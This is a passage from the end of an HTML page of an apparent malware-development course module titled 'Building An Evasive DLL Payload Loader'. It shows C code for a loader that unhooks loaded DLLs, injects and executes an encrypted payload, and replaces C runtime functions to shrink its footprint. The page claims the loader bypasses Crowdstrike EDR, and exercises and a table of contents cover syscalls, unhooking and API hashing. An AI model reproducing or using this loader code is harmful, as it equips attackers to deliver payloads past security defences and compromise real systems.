		<span class="token function">PRINT</span><span class="token punctuation">(</span><span class="token string">"[!] AddVectoredExceptionHandler Failed With Error: %d - %s.%d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">GET_FILENAME</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> </span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Unhook loaded dlls</span>
	<span class="token function">UnhookAllLoadedDlls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">pRemoveVectoredExceptionHandler</span><span class="token punctuation">(</span>pVehHandler<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
		<span class="token function">PRINT</span><span class="token punctuation">(</span><span class="token string">"[!] RemoveVectoredExceptionHandler Failed With Error: %d - %s.%d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">GET_FILENAME</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> </span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Write the payload</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InjectEncryptedPayload</span><span class="token punctuation">(</span>g_pRsrcPayloadBuffer<span class="token punctuation">,</span> g_dwRsrcPayloadSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pInjectedPayload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
		<span class="token function">PRINT</span><span class="token punctuation">(</span><span class="token string">"[!] Failed To Inject The Payload - %s.%d \n"</span><span class="token punctuation">,</span> <span class="token function">GET_FILENAME</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> </span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
	<span class="token function">PRINT</span><span class="token punctuation">(</span><span class="token string">"\n\t\t[*]========&gt; Executing The Payload In %d Seconds &lt;========[*]\n"</span><span class="token punctuation">,</span> PAYLOAD_EXEC_DELAY<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> </span>
	<span class="token function">ExecutePayload</span><span class="token punctuation">(</span>pInjectedPayload<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-40">CRT Library Removal</h3>
<p>When constructing a loader, it's crucial to make adjustments to the 
compiler's configuration as the final step. The process of removing the 
CRT library was initially discussed in <em>Module 79: CRT Library Removal &amp; Malware Compiling</em> module and was then put into practice in <em>Module 81: Bypassing AVs</em> module. By following the procedures outlined in the those modules, certain functions must be replaced with custom versions.</p>
<h4 id="toc-heading-41">Replacing rand()</h4>
<p><code>rand()</code> is replaced with <code>GenerateRandomInt</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">GenerateRandomInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> state <span class="token operator">=</span> <span class="token number">123456789</span><span class="token punctuation">;</span>
    state <span class="token operator">^=</span> state <span class="token operator">&lt;&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span>
    state <span class="token operator">^=</span> state <span class="token operator">&gt;&gt;</span> <span class="token number">17</span><span class="token punctuation">;</span>
    state <span class="token operator">^=</span> state <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> state<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-42">Replacing wcscat()</h4>
<p><code>wcscat</code> is replaced with <code>Wcscat</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">Wcscat</span><span class="token punctuation">(</span>IN WCHAR<span class="token operator">*</span> pDest<span class="token punctuation">,</span> IN WCHAR<span class="token operator">*</span> pSource<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>pDest <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        pDest<span class="token operator">++</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>pSource <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token operator">*</span>pDest <span class="token operator">=</span> <span class="token operator">*</span>pSource<span class="token punctuation">;</span>
        pDest<span class="token operator">++</span><span class="token punctuation">;</span>
        pSource<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token operator">*</span>pDest <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-43">Replacing memcpy()</h4>
<p><code>memcpy</code> is replaced with <code>Memcpy</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">Memcpy</span><span class="token punctuation">(</span>IN PVOID pDestination<span class="token punctuation">,</span> IN PVOID pSource<span class="token punctuation">,</span> SIZE_T sLength<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    PBYTE D <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pDestination<span class="token punctuation">;</span>
    PBYTE S <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pSource<span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>sLength<span class="token operator">--</span><span class="token punctuation">)</span>
        <span class="token operator">*</span>D<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>S<span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-44">Intrinsic Functions</h4>
<p>In addition to function replacements at runtime, the compiler required a custom declaration for the <code>memset</code> and <code>strrchr</code> functions, which is done via the <code>intrinsic</code> keyword. Again, this was introduced and used in the previously mentioned modules.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// replaces 'memset' while compiling</span>
<span class="token keyword">extern</span> <span class="token keyword">void</span><span class="token operator">*</span> __cdecl <span class="token function">memset</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">intrinsic</span><span class="token punctuation">(</span>memset<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">function</span><span class="token punctuation">(</span>memset<span class="token punctuation">)</span></span></span>
<span class="token keyword">void</span><span class="token operator">*</span> __cdecl <span class="token function">memset</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> pTarget<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cbTarget<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pTarget<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>cbTarget<span class="token operator">--</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> pTarget<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">// replaces 'strrchr' while compiling. </span>
<span class="token keyword">extern</span> <span class="token keyword">void</span><span class="token operator">*</span> __cdecl <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">intrinsic</span><span class="token punctuation">(</span>strrchr<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">function</span><span class="token punctuation">(</span>strrchr<span class="token punctuation">)</span></span></span>
<span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span><span class="token operator">*</span> last_occurrence <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            last_occurrence <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>str<span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>
        str<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> last_occurrence<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-45">Results</h3>
<p>Once all the necessary compiler configurations have been established, our DLL loader, named <code>DllLoader.dll</code>, will only import the following functions when debug mode is disabled:</p>
<img width="800" alt="image" style="margin:auto" src="23_files/dllldr-866766950-42a0d192-4bac-4fe0-840d-aba4a7062430.png">
<p>Additionally, <code>DllLoader.dll</code> will export a single function, <code>InitiateTheAttack</code>.</p>
<img width="800" alt="image" style="margin:auto" src="23_files/dllldr-966766998-4ba1bd16-0b50-4082-8980-622382d69aee.png">
<h3 id="toc-heading-46">Bypassing Crowdstrike EDR</h3>
<p>The picture below shows the payload loader evading Crowdstrike EDR.</p>
<img width="800px" style="margin:auto" src="23_files/CS-Bypass-Ldr.png">
<h3 id="toc-heading-47">Video Demo</h3>
<video style="margin:auto" width="1400" controls="controls" class="js-parse-2dd74396fb4949db9d79c16e578d6d88">
  <source src="23_files/DllLdr-demo.mp4" type="video/mp4" class="js-parse-2dd74396fb4949db9d79c16e578d6d88">
  Your browser does not support the video tag.
</video>

    </div>

    
        
</div></div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Edit the InjectEncryptedPayload function to decrypt the payload after allocating the RWX memory</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Execute the payload via a different callback function</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use a different string hashing algorithm</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:40px" data-target-id="toc-heading-0">
        <span class="text-gray-300 hover:text-white text-sm">Building An Evasive DLL Payload Loader</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-1">
        <span class="text-gray-300 hover:text-white text-sm">Introduction</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-2">
        <span class="text-gray-300 hover:text-white text-sm">Benefits Of a DLL Loader</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-3">
        <span class="text-gray-300 hover:text-white text-sm">Loader's Capabilities</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-4">
        <span class="text-gray-300 hover:text-white text-sm">Improving HellsHall</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-5">
        <span class="text-gray-300 hover:text-white text-sm">Using Win32u.dll</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-6">
        <span class="text-gray-300 hover:text-white text-sm">HellsHall's New Functions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-7">
        <span class="text-gray-300 hover:text-white text-sm">Loading Win32u.dll</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-8">
        <span class="text-gray-300 hover:text-white text-sm">MODULE_CONFIG Structure</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-9">
        <span class="text-gray-300 hover:text-white text-sm">InitDllsConfigStructs Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-10">
        <span class="text-gray-300 hover:text-white text-sm">FetchWin32uSyscallInst Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-11">
        <span class="text-gray-300 hover:text-white text-sm">Updating FetchNtSyscall</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-12">
        <span class="text-gray-300 hover:text-white text-sm">NT_SYSCAL Structure</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-13">
        <span class="text-gray-300 hover:text-white text-sm">CRCHASH Macro</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-14">
        <span class="text-gray-300 hover:text-white text-sm">FetchNtSyscall Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-15">
        <span class="text-gray-300 hover:text-white text-sm">NT_API Structure</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-16">
        <span class="text-gray-300 hover:text-white text-sm">InitIndirectSyscalls Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-17">
        <span class="text-gray-300 hover:text-white text-sm">Unhooking Without RWX permissions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-18">
        <span class="text-gray-300 hover:text-white text-sm">MapDllFromKnownDllDir Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-19">
        <span class="text-gray-300 hover:text-white text-sm">UnhookAllLoadedDlls Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-20">
        <span class="text-gray-300 hover:text-white text-sm">VectoredExceptionHandler Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-21">
        <span class="text-gray-300 hover:text-white text-sm">Custom AES Library</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-22">
        <span class="text-gray-300 hover:text-white text-sm">Enhancing AES Functions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-23">
        <span class="text-gray-300 hover:text-white text-sm">Payload Encryption</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-24">
        <span class="text-gray-300 hover:text-white text-sm">Payload Decryption</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-25">
        <span class="text-gray-300 hover:text-white text-sm">Payload Injection By Chunking</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-26">
        <span class="text-gray-300 hover:text-white text-sm">Payload Injection Steps</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-27">
        <span class="text-gray-300 hover:text-white text-sm">InjectEncryptedPayload Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-28">
        <span class="text-gray-300 hover:text-white text-sm">Executing Payload</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-29">
        <span class="text-gray-300 hover:text-white text-sm">API Hashing</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-30">
        <span class="text-gray-300 hover:text-white text-sm">GetModuleHandleH Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-31">
        <span class="text-gray-300 hover:text-white text-sm">GetProcAddressH Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-32">
        <span class="text-gray-300 hover:text-white text-sm">HashCalculator Project</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-33">
        <span class="text-gray-300 hover:text-white text-sm">API Camouflage</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-34">
        <span class="text-gray-300 hover:text-white text-sm">Delaying Execution</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-35">
        <span class="text-gray-300 hover:text-white text-sm">Printing DLL's Debug Information</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-36">
        <span class="text-gray-300 hover:text-white text-sm">Replacing Printf()</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-37">
        <span class="text-gray-300 hover:text-white text-sm">Enabling Debug Mode</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-38">
        <span class="text-gray-300 hover:text-white text-sm">DllMain Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-39">
        <span class="text-gray-300 hover:text-white text-sm">InitiateTheAttack Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-40">
        <span class="text-gray-300 hover:text-white text-sm">CRT Library Removal</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-41">
        <span class="text-gray-300 hover:text-white text-sm">Replacing rand()</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-42">
        <span class="text-gray-300 hover:text-white text-sm">Replacing wcscat()</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-43">
        <span class="text-gray-300 hover:text-white text-sm">Replacing memcpy()</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-44">
        <span class="text-gray-300 hover:text-white text-sm">Intrinsic Functions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-45">
        <span class="text-gray-300 hover:text-white text-sm">Results</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-46">
        <span class="text-gray-300 hover:text-white text-sm">Bypassing Crowdstrike EDR</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-47">
        <span class="text-gray-300 hover:text-white text-sm">Video Demo</span>
      </div></div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="23_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill="">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html">
